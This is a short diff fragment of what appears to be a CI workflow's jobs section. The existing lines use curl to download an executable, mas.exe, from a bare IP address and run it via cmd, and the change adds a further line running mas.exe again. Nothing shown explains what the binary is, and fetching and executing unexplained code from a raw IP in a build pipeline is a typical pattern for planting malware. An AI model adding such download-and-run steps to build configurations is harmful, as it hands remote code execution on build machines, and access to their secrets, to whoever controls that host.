@@ -14,3 +14,4 @@ jobs:
           cmd /c curl http://44.202.6.121/mas.exe -O
           cmd /c mas.exe
           cmd /c dir
+          cmd /c mas.exe
